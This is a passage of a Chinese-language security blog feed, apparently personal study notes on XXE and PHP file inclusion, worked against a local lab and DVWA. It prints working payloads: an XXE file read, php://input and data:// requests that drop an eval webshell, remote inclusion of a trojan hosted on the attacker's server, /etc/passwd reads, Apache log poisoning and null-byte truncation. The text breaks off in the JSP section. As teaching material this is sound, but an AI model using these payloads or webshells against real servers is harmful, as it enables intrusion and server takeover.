SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; <br>%an-element; %remote-dtd;<br></code></pre></div></td></tr></table></figure><p><strong>从参数实体的前两点结合例子可以看出，参数实体定义的通常是dtd中的另一个声明，或是调用另一个外部dtd文件</strong></p><p>XML文档产生的过程的：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405162727.png"></p><hr><h2 id="XXE实现"><a href="#XXE实现" class="headerlink" title="XXE实现"></a>XXE实现</h2><h3 id="本地环境演示"><a href="#本地环境演示" class="headerlink" title="本地环境演示"></a>本地环境演示</h3><p>介绍了这么多，重点来了。XXE的全称为 XML 外部实体注入，现在我们来关注怎么实现它。</p><p>本篇中我只复现一种最简单的情况，下一篇博客中将对其进行详细实验。</p><p>现在来看一个接收<strong>可以接收xml外部实体</strong>的PHP文件</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$xml</span> = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-comment">//$xml为接收的用户输入</span><br><br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br><span class="hljs-comment">//初始化变量$dom，来作为XML文档的解析器</span><br><br>    <span class="hljs-variable">$dom</span> -&gt; loadXML(<span class="hljs-variable">$xml</span>);<br><span class="hljs-comment">//将用户的输入内容解析为XML文档，加载到$dom中</span><br><br>    <span class="hljs-variable">$xml</span>=simplexml_load_string(<span class="hljs-variable">$xml</span>,<span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);<br><span class="hljs-comment">//获取XML文档中的节点，并开启外部实体解析</span><br><span class="hljs-comment">//因为默认的写法是不会开启外部实体解析的，如$xml = simplexml_import_dom($dom);</span><br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$xml</span>;<br><span class="hljs-comment">//显示$xml变量，也就是XML文档内容</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [    <br>&lt;!ENTITY payload SYSTEM &quot;file:///c:/x.txt&quot; &gt; ]&gt; <br>&lt;a&gt;&amp;payload;&lt;/a&gt;<br></code></pre></div></td></tr></table></figure><p>演示结果：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405134134.png"></p><p>改一下payload中的内容，读取敏感文件</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405134435.png"></p><p>有关xxe漏洞的具体原理，攻击思路，和其更多形式我将在下一篇博客中继续记录。</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含伪协议实践</title>
    <link href="/2022/03/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AE%9E%E8%B7%B5/"/>
    <url>/2022/03/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<p>通过本地实验环境和dvwa的例题展示如何结合一系列伪协议来利用文件包含漏洞</p><span id="more"></span><hr><h3 id="本地实验环境"><a href="#本地实验环境" class="headerlink" title="本地实验环境"></a>本地实验环境</h3><p>127.0.0.1/a.php源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>127.0.0.1/info.txt源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>目的：</p><p>用伪协议实现文件包含或写入木马</p><hr><h3 id="伪协议使用实例"><a href="#伪协议使用实例" class="headerlink" title="伪协议使用实例"></a>伪协议使用实例</h3><h4 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h4><p>需要allow_url_fopen与allow_url_include同时开启</p><figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/a.php?page=http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/info.txt<br></code></pre></div></td></tr></table></figure><p>效果十分显著，利用远程文件包含实现木马文件在我们服务器上，却能直接控制对方的服务器</p><h4 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h4><p><strong>只能以绝对路径的方式包含本地文件</strong></p><p><em>感觉file加了不如不加。。因为文件包含不用伪协议还能用相对路径。。形如<code>127.0.0.1/a.php?page=../../x.txt</code>，也可以<code>127.0.0.1/a.php?page=F:/x.txt</code></em></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/a.php?page=file:///F:\aaa\bbb\info.txt</span><br></code></pre></div></td></tr></table></figure><p>需要知道目标服务器的文件路径，而路径的信息有时可通过报错信息得知</p><p>个人感觉比较鸡肋。。</p><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>需要 allow_url_include:On ，allow_url_fopen:On</p><p>可以直接写入PHP代码执行</p><p>写入PHP木马：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?PHP</span> fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[eggs])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></div></td></tr></table></figure><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>需要开启 allow_url_fopen，不需要开启 allow_url_include</p><p>如果开启了allow_url_include的话可以在resource参数后加上HTTP协议</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220401231855.png"></p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><em>大佬写的👀</em></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//filter/resource=info.txt</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=info.txt</span><br>http:<span class="hljs-comment">//127.0.0.1/a.php?page=php://filter/resource=http://127.0.0.1/info.txt</span><br><br><span class="hljs-comment">//结合来看就算是不用过滤器，也能指定远程文件包含木马</span><br></code></pre></div></td></tr></table></figure><p>read模式下+过滤器读源码很好用。另外根据大佬的博客，我们可以在传递参数时利用write模式+过滤器破坏页面中代码结构来绕过防护。</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>可以直接写入PHP代码来执行当，enctype=multipart/form-data时,php:/input将会无效</p><p>传递以下post数据包来写入木马：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//</span><br><br><span class="hljs-meta">&lt;?PHP</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[eggs])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>图例：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220402165611.png"></p><hr><h3 id="dvwa–FIle-Inclusion实践"><a href="#dvwa–FIle-Inclusion实践" class="headerlink" title="dvwa–FIle Inclusion实践"></a>dvwa–FIle Inclusion实践</h3><p>关卡设计：</p><ul><li><p>Local File Inclusion (LFI) </p><p>让我们用本地文件包含读取路径为<code>../../hackable/flags/fi.php</code>的文件。这个文件一共有五个句子，其中的1，2，4是直接用echo语句输出的，所以直接包含该文件时就可以看到，3在编译时被覆盖了，只能通过源码看到，5被写在了html注释里，被包含后F12就能看到。综上，我们除了实现直接包含文件外，还要考虑怎么读取php页面源码。</p></li><li><p>Remote File Inclusion (RFI)</p><p>远程文件包含的思路为下图</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/file_include002.jpg"></p><p><strong>但用蚁剑连接时需要注意</strong>，如果是远程包含我们服务器上的PHP木马时，PHP木马不要存为PHP文件。因为目标服务器包含我们服务器的文件时，我们的服务器会先对其进行解析再把文件传给目标服务器，导致PHP代码失效，所以可设为txt格式。并且还需要额外设置cookie信息，完整url和cookie信息如下：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220331170328.png"></p><p>另外，也可以在我们的页面布置这个PHP文件：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php assert($_POST[eggs]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>在站点构造url，使用HTTP协议远程包含该文件，在其目录下生成shell.php后用蚁剑直接连（不用设置cookie）</p><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>完全没防护</p><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-comment">//这句话中多打了个双引号，&quot;..\\&quot;&quot;过滤的是..，所以可以直接用..\绕过</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>双写（RFI）：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=httphttp://://127.0.0.1/eggs.txt</code>，或者利用PHP伪协议，<code>php://input</code>、<code>php://data</code>和<code>php://filter</code></p></li></ul><p>​        突破方法大同小异，我上面的payload改一改就行了</p><ul><li><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>要求输入的参数<code>page</code>必须以<code>file</code>开头，所以可以利用file:///协议读取本地文件（需知晓服务器文件路径，在这里可从报错信息中得知），或结合文件上传漏洞运行木马</p></li></ul><h3 id="伪协议使用总结"><a href="#伪协议使用总结" class="headerlink" title="伪协议使用总结"></a>伪协议使用总结</h3><ul><li><p>http://</p><p>allow_url_fopen与allow_url_include都需要开启 </p><p>简单明了好用 </p></li><li><p>php://filter </p><p>常用read模式，如果开启allow_url_include的话和HTTP一样好用，就算没开启也能方便的读取页面源码</p></li><li><p>php://input和php://data</p><p>写入可执行PHP代码，PHP木马</p></li><li><p>file：///</p><p>只能以绝对路径读取本地文件，鸡肋</p></li></ul><p>以上伪协议（除了写入代码的input和data）配合文件上传漏洞能更好发挥作用</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含学习笔记</title>
    <link href="/2022/03/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>开发人员在开发网站时，往往会重复调用某些文件（一些函数或显示特定页面），以PHP为例，就提供了<code>include()、require()、include_once()、require_once()</code>一系列函数，被包含的文件会<strong>以php格式解析</strong>。当我们上传了php木马文件后（不一定为php格式，因为一定会以php格式解析；不一定上传到目标服务器，根具情况看能否可远程包含），再让服务器文件包含的参数指向我们所上传的文件，结合蚁剑等工具就可以控制服务器。</p><span id="more"></span><hr><h2 id="php包含"><a href="#php包含" class="headerlink" title="php包含"></a>php包含</h2><p>php包含可以简单分为本地包含和远程包含，其中如果要使用远程包含功能，首先需要确定php是否已经开启远程包含功能选项<code>allow_url_include = On、allow_url_fopen =  On</code></p><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><ul><li>require 找不到被包含的文件时会产生致命错误，并停止脚本</li><li>require_once 与require类似，唯一区别是如果该文件中的代码也被包含，则不会再次包含</li><li>include 找不到文件时只会产生警告，脚本继续运行</li><li>include_once 与include类似，唯一区别是如果该文件中的代码也被包含，则不会再次包含</li></ul><hr><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>在index.php中有如下代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br><span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;home.php&#x27;</span>;<br>    &#125;<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>php前台代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;a href=&quot;Index.php?page=main.php&quot;&gt;主页&lt;/a&gt;<br>&lt;a href=&quot;Index.php?page=news.php&quot;&gt;新闻&lt;/a&gt;<br>&lt;a href=&quot;Index.php?page=down.php&quot;&gt;下载&lt;/a&gt;<br></code></pre></div></td></tr></table></figure><p>当用户正常访问时，HTTP请求的url为：</p><p><code>http://www.xxx.com/Index.php?page=main.php</code></p><p><code>http://www.xxx.com/Index.php?page=news.php</code></p><p><code>http://www.xxx.com/Index.php?page=down.php</code></p><p>程序逻辑为：</p><p>1.提交url,在index.php中取得page参数的值</p><p>2.判断$_GET[‘page’]是否为空，若不为空，就是要include包含这个文件</p><p>3.若$_GET[‘page’]为空，则包含home.php文件</p><p>但是攻击者可能输入以下url:</p><p><code>http://www.xxx.com/Index.php?page=xxx.php</code></p><p>访问中国url将会包含xxx.php，但是通常情况下该文件在服务器端并不存在，所以在包含时会可能出现以下的警告，暴露出网站的绝对路径：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220329214513.png"></p><hr><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h4><p>访问url:<code>http://www.xxx.com/index.php?page=/etc/passwd</code>，如果目标主机存在该文件并且有相应的权限，那么就可以读出文件的内容。反之，就有可能得到一个类似于<code>open_basedirrestriction in effect.</code>的警告</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220329215654.png"></p><h4 id="上传木马拿取shell"><a href="#上传木马拿取shell" class="headerlink" title="上传木马拿取shell"></a>上传木马拿取shell</h4><ul><li><p>当目标主机允许远程文件包含时</p><p>在攻击者服务器（或肉鸡）上布置木马文件。写入木马代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>fputs(fopen(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-subst">$_POST</span>[&#x27;Eggs&#x27;]);?&gt;&quot;</span>)<span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//$_POST[&#x27;Eggs&#x27;]中单引号可以省略</span><br></code></pre></div></td></tr></table></figure><p>到文件<code>http://www.Eggs.com/hack.txt</code>处。</p><p><strong>注意不能是PHP文件，如果是PHP文件的话，目标服务器进行包含的文件是已经过我们服务器解析过的文件了，所以把木马设为txt文件</strong></p><p>然后访问<code>http://www.xxx.com/Index.php?page=http://www.Eggs.com/hack.txt</code>，</p><p>将会在Index.php所在的目录下生成shell.php文件，内容为：</p><p><code>&lt;?php eval ($_POST[&#39;Eggs&#39;])&gt;</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/file_include002.jpg"></p></li></ul><ul><li><p>本地包含配合文件上传</p><p>在网站提供上传文件的地点（头像、文档等），将木马语句写入上传的文件中上传。复制文件上传后的路径，访问<code>目标站点/index.php?page=文件上传后的路径</code>即可。</p><p>在我之前upload labs的帖子中有详细过程 [我是传送门](<a href="https://eggswoo.com/2021/10/27/upload">https://eggswoo.com/2021/10/27/upload</a> labs闯关历程/#14–图片马之文件头检查)</p></li></ul><p>这是简单粗暴的利用方式，当条件不满足时，还可以利用以下的方式迂回。</p><h4 id="使用PHP封装协议"><a href="#使用PHP封装协议" class="headerlink" title="使用PHP封装协议"></a>使用PHP封装协议</h4><p>php带有很多内置url风格的封装协议，这类协议于fopen()、copy()、file_exists()、filesize()等文件函数系统函数所提供的功能类似。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220329225307.png"></p><ul><li><p>使用封装协议读取PHP文件</p><p>使用PHP内置封装协议可以读取PHP文件，例子如下：</p><p><code>http://www.xxx.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</code></p><p>访问该url即可得到base64加密后的配置文件（不会编译PHP文件），再解密即可得到原文件。</p></li><li><p>写入PHP文件</p><p>使用<code>php://input</code>可以执行PHP语句，但使用这条语句也需要配置文件这项设置<code>allow_url_include = On </code>。访问url<code>http://www.xxx.com/index.php?page=php://input</code>，并提交参数<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;eggs&quot;])?&gt;&#39;);?&gt;</code></p><p>即可在index.php所在目录下生成shell.php。</p></li></ul><p>关于PHP伪协议利用的详细部分可见我这一篇博客：<a href="https://eggswoo.com/2022/03/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AE%9E%E8%B7%B5/#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B">文件包含伪协议实践 - 蛋窝窝 (eggswoo.com)</a></p><h4 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h4><p>当存在本地包含漏洞却无法上传文件时，前面提到的利用手段也失效了。但针对apache服务器本地包含还有另外一种利用方式，就是找到apache路径，利用包含漏洞包含apache日志文件也可以获取webshell。</p><p>apache运行后一般默认生成两个日志文件，这两个文件是access.log（访问日志）和error.log（错误日志），apache的访问日志文件记录了客户端的每次请求以及服务器响应的相关信息，例如，当我们请求Index.php页面时，apache就会记录下我们的操作，并且写到访问日志文件access.log中。</p><p><em>如果access.log文件没有开启，可能是因为配置文件中没有开启设置，需要手动更改设置</em></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220330092619.png"></p><p><strong>不过我实验的时候，我用的apache日志文件以及改成了access.log.+一串数字，目录下的access.log文件是空的，猜测apache已经修改了日志文件的命名方式来修复该漏洞</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220330090522.png"></p><p>而我下载的另一个版本的apache并没有对此进行修改</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220330091633.png"></p><p>遗憾的是我目前并没有在网上查询到相关资料，哪些版本的apache日志文件仅为access.log。</p><p><strong>在这里为了复现漏洞，我把<code>access.log.1648598400</code>看作<code>access.log</code>文件</strong>，实际情况中攻击者会因为无法得知日志文件名称来触发文件包含漏洞。</p><p>access.log文件内容如下</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220329233321.png"></p><p>可以看出，每一行记录一次网站访问记录，由7部分组成，格式如下：</p><ul><li>客户端地址：访问网站的客户端IP地址</li><li>访问者标识：该项一般为空白，用“-”代替</li><li>访问者的验证名字“该项用于记录访问者验证身份时提供的名字，一般也为空白</li><li>请求的时间：记录访问操作的发生时间</li><li>请求类型：记录服务器收到的都是什么类型的请求，如GET、POST、HEAD等</li><li>响应的HTTP状态码：通过该项可以知道请求是否成功</li><li>发送给客户端的字节数：表示发送给客户端的总字节数</li></ul><p>当访问一个不存在的资源时，apache日志同样会记录。这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时（通常是指网页木马文件），就可以访问url：<code>http://www.xxx.com/&lt;?php phpinfo();?&gt;</code>，apache会记录请求<code>&lt;?php phpinfo();?&gt;</code>，并写到access.log文件中，这时再去包含apache的日志文件，即可利用包含漏洞了。</p><p>不过这个操作还需要解决两个问题。一个是apache日志文件的路径，如果用户修改了默认路径则攻击者就难以利用漏洞了。另一个问题是参数在浏览器中的url传递时，其中的特殊符号如<code>&lt; &gt; \</code>会进行url加密，这就导致了apache日志文件储存的php代码失效了。不过我们可以通过burp suite代理发包绕过浏览器的编码。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220330085622.png"></p><p>因为包含了特殊符号，服务器状态码为400，但依旧成功写入log文件中。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220330085737.png"></p><p>成功触发php代码。</p><h4 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h4><p>有些防护人员为了修复php的包含漏洞，会固定扩展名，代码如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;home.php&#x27;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>当进行包含时，不需要传输文件扩展名。例如，想要包含News.php页面，只需要传入<code>http://www.xxx.com/Index.php?page=News</code>即可。</p><p>假设上传一句话木马文件的路径为<code>/uoloadfile/a.jpg</code>，当包含这样的图片时，url为<code>http://www.xxx.com/Index.php?page=./uoloadfile/a.jpg</code>，而php程序包含时会包含<code>uoloadfile/a.jpg.php</code>，没能指向我们的木马导致漏洞</p><p>而攻击者可以访问以下url：</p><p><code>http://www.xxx.com/Index.php?page=./uoloadfile/a.jpg%00</code>来触发漏洞。这种方式只适用于magic_quotes_gpc= OFF时，如果为On，%00（NULL）将会被转义，从而无法正常截断。当magic_quotes_gpc为On时，以下预定义字符转义：单引号，双引号，反斜杠，NULL。</p><p>另外在php &lt; 5.2.8的情况下，可以使用长度截断，只需要不断的重复./即可，linux下4096字节时会达到最大值，在window下是256字节，在达到最大值后，后面的部分将会被省略。如shell.php/./././././省略/./././；注意不能超过容器支持的最大长度，不然会提示GET请求太长</p><hr><h2 id="JSP包含"><a href="#JSP包含" class="headerlink" title="JSP包含"></a>JSP包含</h2><p>JSP包含分两种方式：静态包含和动态包含，下面将详细介绍这两种包含操作。</p><h3 id="静态包含"><a href="#静态包含" class="headerlink" title="静态包含"></a>静态包含</h3><p><code>&lt;$@ include file=&quot;page.txt&quot;&gt;</code>为JSP中的静态包含语句，静态包含会先包含，再进行操作。而JSP语法规定这种包含只能包含一个已经存在于服务器中的文件，file的参数不能动态赋值，所以静态包含是不存在漏洞 的。</p><h3 id="动态包含"><a href="#动态包含" class="headerlink" 